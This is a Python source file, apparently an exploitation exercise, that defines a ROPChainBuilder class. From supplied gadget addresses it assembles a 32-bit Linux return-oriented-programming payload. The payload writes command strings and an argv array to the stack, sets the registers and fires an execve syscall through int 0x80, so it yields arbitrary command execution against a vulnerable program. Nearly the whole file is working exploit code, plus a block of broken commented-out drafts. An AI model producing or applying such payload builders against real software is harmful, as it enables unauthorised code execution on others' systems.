import struct
import sys
from struct import pack

# Helper to build a gadget sequence: [Address] + [Value] + [Padding]
# def add_gadget(gadget_tuple,pop_type=None, value_bytes, dummy_bytes, self.current_register_vals):
#     inst_addr, junk_count, affected = gadget_tuple

#     important={}

#     for i in affected:
#         important[i]=self.current_register_vals.get(i,None)
    
    
#     chain = inst_addr           # 1. The address of the instruction
    
#     if value_bytes:             # 2. The value to pop into the register (if applicable)
#         chain += value_bytes
        
#     # 3. Automatic padding for dirty gadgets
#     # e.g., if gadget is "pop ecx; pop ebx; ret", junk_count is 1.
#     # We add 1 dummy value to satisfy the extra pop.
#     chain += dummy_bytes * junk_count 
#     if junk_count > 0:
#         print(gadget_tuple)
#         print(junk_count)

#     if pop_type:
#         self.current_register_vals[pop_type] = value_bytes
#     if affected
    
       
#     return self.current_register_vals,chain

# def build_rop_chain(commands, gadgets):
#     # --- 1. Unpack Gadgets ---
#     # We unpack the tuples (instruction_bytes, junk_count)
#     g_pop_edx = gadgets["POPEDX"]
#     g_pop_eax = gadgets["POPEAX"]
#     g_pop_ebx = gadgets["POPEBX"]
#     g_pop_ecx = gadgets["POPECX"]
    
#     g_mov     = gadgets["MOVISTACK"]
#     g_xor_eax = gadgets["XOREAX"]
#     g_inc_eax = gadgets["INCEAX"]
#     g_int80   = gadgets["INT80"]
    
#     # These are single values, not tuples
#     STACK_ADDR_BYTES = gadgets["STACK"] 
#     self.dummy_bytes      = gadgets["DUMMY"]

#     # Convert STACK address to integer for math
    

class ROPChainBuilder:
    def __init__(self, vulnerable_program, gadgets):
        
        self.pop_edx = gadgets["POPEDX"]
        self.pop_eax = gadgets["POPEAX"]
        self.pop_ebx = gadgets["POPEBX"]
        self.pop_ecx = gadgets["POPECX"]
        self.mov_istack = gadgets["MOVISTACK"]
        self.xor_eax = gadgets["XOREAX"]
        self.inc_eax = gadgets["INCEAX"]
        self.int_80 = gadgets["INT80"]
        self.stack_addr_bytes = gadgets["STACK"]
        self.dummy_bytes = gadgets["DUMMY"]

        self.pop_dict={
            "edx": self.pop_edx,
            "eax": self.pop_eax,
            "ebx": self.pop_ebx,
            "ecx": self.pop_ecx
        }

        self.current_register_vals = {
            "edx": None,
            "eax": None,
            "ebx": None,
            "ecx": None
        }

    def add_gadget(self, gadget_tuple, pop_type=None, value_bytes=None):
        print(self.current_register_vals,pop_type,value_bytes)
        inst_addr, junk_count, affected = gadget_tuple

        important={}

        for i in affected:
            if self.current_register_vals.get(i,None) is not None:
                important[i]=self.current_register_vals[i]
        
        chain=b""
        chain += inst_addr           
        
        
        if pop_type and value_bytes:
            
            print(chain)
            print(value_bytes)
            chain +=  value_bytes  
            self.current_register_vals[pop_type] = value_bytes
            
            
        # 3. Automatic padding for dirty gadgets
        # e.g., if gadget is "pop ecx; pop ebx; ret", junk_count is 1.
        # We add 1 dummy value to satisfy the extra pop.
        
        if junk_count > 0:
            chain += self.dummy_bytes * junk_count 
            print(pop_type,gadget_tuple)

        for reg in affected:
            if reg != pop_type:
                self.current_register_vals[reg] = None
        for reg,old_val in important.items():
            restore_gadget = self.pop_dict[reg]
            chain += self.add_gadget(restore_gadget,reg,old_val)
            
        
        return chain
        
    def build_chain(self, commands, offset):
        stack_cursor = struct.unpack("<I", self.stack_addr_bytes)[0]

        buff = b""
        string_addresses = []
        current_string_addr = stack_cursor


        
        # --- 2. Write Strings to Stack ---
        for command in commands:
            # Pad command to multiple of 4
            if len(command) % 4 != 0:
                remainder = 4 - (len(command) % 4)
                if "/" in command:
                    idx = command.index("/")
                    command = command[:idx+1] + ("/" * remainder) + command[idx+1:]
                else:
                    print("Warning: Command length not multiple of 4 and no '/' to pad.")
                    sys.exit(1)

            cmd_bytes = command.encode('latin-1')  # Ensure null termination logic if needed, usually we write chunks
            
            # Determine actual chunks to write (excluding the implicit null usually, but here we write 4 bytes)
            # Re-encoding to ensure we handle the loop correctly
            final_cmd_bytes = command.encode('latin-1') 

            for i in range(0, len(final_cmd_bytes), 4):
                chunk = final_cmd_bytes[i:i+4]
                if len(chunk) < 4:
                    chunk = chunk + b'\x00' * (4-len(chunk))

                # POP EDX (Destination Address)

                buff += self.add_gadget(self.pop_edx,'edx', pack("<I", stack_cursor))

                # POP EAX (String Chunk)

                buff += self.add_gadget(self.pop_eax,'eax', chunk)


                # MOV [EDX], EAX

                buff += self.add_gadget(self.mov_istack)

                
                stack_cursor += 4

            # Write the Null Terminator for this specific string
           
            buff += self.add_gadget(self.pop_edx,'edx', pack("<I", stack_cursor))
           
            buff += self.add_gadget(self.xor_eax) # EAX = 0
           
            buff += self.add_gadget(self.mov_istack)     # Write 0 to stack
            
            # Save where this string started
            string_addresses.append(current_string_addr)
            
            stack_cursor += 4 # Move past null terminator
            current_string_addr = stack_cursor # Next string starts here

        # --- 3. Build argv Array ---
        # We have written the strings. Now we write the pointers to those strings.
        argv_start = stack_cursor
        
        for addr in string_addresses:
            # Write Address of string N to stack

            buff += self.add_gadget(self.pop_edx,'edx', pack("<I", stack_cursor))

            buff += self.add_gadget(self.pop_eax,'eax', pack("<I", addr))

            buff += self.add_gadget(self.mov_istack)
            stack_cursor += 4

        # Null pointer at end of argv array

        buff += self.add_gadget(self.pop_edx,'edx', pack("<I", stack_cursor))
    
        buff += self.add_gadget(self.pop_eax,'eax', pack("<I", 0))
       
        buff += self.add_gadget(self.mov_istack)
        stack_cursor += 4

        # --- 4. Load Registers for execve ---
        # EBX = Pointer to filename (first string)
      
        buff += self.add_gadget(self.pop_ebx,'ebx', pack("<I", string_addresses[0]))

        # ECX = Pointer to argv array
       
        buff += self.add_gadget(self.pop_ecx,'ecx', pack("<I", argv_start))
        # print("pop ebx")
        # buff += self.add_gadget(self.pop_ebx, pack("<I", string_addresses[0]), self.dummy_bytes)  # NULL envp
        # EDX = 0 (Environment pointer, NULL)

        buff += self.add_gadget(self.pop_edx,'edx', pack("<I", 0))

        # EAX = 11 (execve syscall number)
        buff += self.add_gadget(self.xor_eax)
        
        # Handle INCEAX loop (Need to unpack tuple inside loop)

        inc_inst, inc_junk,inc_affected = self.inc_eax
        for _ in range(11):
            buff += inc_inst
            buff += self.dummy_bytes * inc_junk

        # --- 5. Trigger ---
        buff += self.add_gadget(self.int_80)

        return buff